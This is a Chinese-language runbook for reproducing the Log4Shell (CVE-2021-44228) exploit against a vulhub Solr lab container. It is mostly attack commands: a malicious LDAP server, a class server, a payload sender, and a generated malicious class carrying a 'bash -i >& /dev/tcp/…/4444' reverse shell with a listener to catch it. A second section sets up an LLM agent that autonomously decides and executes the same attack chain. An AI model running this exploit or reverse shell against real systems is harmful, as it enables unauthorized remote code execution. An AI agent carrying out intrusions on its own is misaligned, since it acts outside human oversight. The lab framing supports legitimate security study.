#  Log4Shell完整复现操作手册（非AI + AI）



## 1. 环境准备

### 1.1 靶机（Docker + vulhub）

```bash
# 获取 vulhub 靶机（sparse 检出，只取 log4j 目录）
mkdir -p ~/lab && cd ~/lab
git clone --depth 1 --filter=blob:none --sparse https://github.com/vulhub/vulhub.git
cd vulhub && git sparse-checkout set log4j/CVE-2021-44228
cd log4j/CVE-2021-44228 && docker compose up -d
docker ps     #  cve-2021-44228-solr-1，端口8983
```

### 1.2 攻击机工具链（本机注意事项）

```bash
java -version     # 本机 java 是 JDK 21
javac -version    # 真正的编译器在 JDK 21：/usr/lib/jvm/java-21-openjdk-amd64

# 所有涉及编译的命令统一指定 JDK 21（Maven 也依赖它）
export JAVA_HOME=/usr/lib/jvm/java-21-openjdk-amd64
export PATH=$JAVA_HOME/bin:$PATH

# Maven
export PATH=/opt/maven/bin:$PATH
```





## 2.非AI路线

### 2.1 编译与测试

```bash
export JAVA_HOME=/usr/lib/jvm/java-21-openjdk-amd64
cd java_toolkit
javac -d classes src/*.java

# 集成测试：LDAP 协议握手 + HTTP + 类生成 + Payload + 扫描
java -cp classes ToolTest          # 期望结果为 passed=13 failed=0

# 端到端（需要 Solr 容器在线）：完整攻击链 + 自动探测
java -cp classes E2ETest           # 期望 [PASS] 端到端验证成功, 则反弹 Shell 成功建立
```

### 2.2 四终端使用

```bash
# 终端 1：恶意 LDAP
java -cp classes MaliciousLDAPServer 1389 http://192.168.217.143:8888/
# 终端 2：HTTP 文件服务器
java -cp classes HttpFileServer exploit_dir 8888
# 终端 3：生成恶意类（javac --release 8，自动校验 major 52）
java -cp classes MaliciousClassGenerator "bash -i >& /dev/tcp/192.168.217.143/4444 0>&1" exploit_dir
# 终端 4：反弹 Shell 监听
java -cp classes ReverseShellListener 4444
# 发送 Payload 触发（400 是正常现象）
java -cp classes PayloadSender 172.18.0.2 8983 "ldap://192.168.217.143:1389/cn=Exploit"
# 观察结果
```





## 3：AI Agent 路线（LLM 自主决策）

### 3.1 编译与测试

```bash
export JAVA_HOME=/usr/lib/jvm/java-21-openjdk-amd64
export PATH=/opt/maven/bin:$PATH
cd agent_toolkit
mvn -q package -DskipTests        # 产出 target/agent-toolkit-1.0.0.jar
```

### 3.2 离线自检（无需 LLM、无需靶机）

```bash
# 8 项断言的完整自检（Mock 决策 + FakeTarget 模拟靶机 + 真实 LDAP 握手）
java -cp target/agent-toolkit-1.0.0.jar agent.AgentTest   # 期望 8/8 PASS

# 完整跑一遍决策循环，看是否可以跑通即可
java -jar target/agent-toolkit-1.0.0.jar --mock --target 127.0.0.1 --port 18080
```

### 3.3 配置 LLM环境变量 

```bash
# Ollama 本地模型
export LLM_BASE_URL=http://localhost:11434/v1
export LLM_API_KEY=ollama
export LLM_MODEL=qwen2.5:7b

# 攻击机地址（LDAP codebase / 反弹 Shell 回调；自动探测本机 IPv4）
export ATTACKER_IP=192.168.217.143
```

### 3.4 真实 LLM运行

```bash
java -jar target/agent-toolkit-1.0.0.jar --target 172.18.0.2 --port 8983 --path /solr/admin/cores
```





## 4：清理环境

```bash
# 停止靶机
cd ~/lab/vulhub/log4j/CVE-2021-44228 && docker compose down
# 停止攻击机服务
pkill -f "java LDAPRefServer" ; pkill -f "http.server 8888" ; pkill -f "nc -lvnp 4444"
pkill -f "java -cp classes" ; pkill -f "agent-toolkit" ; rm -f /tmp/fifo
```

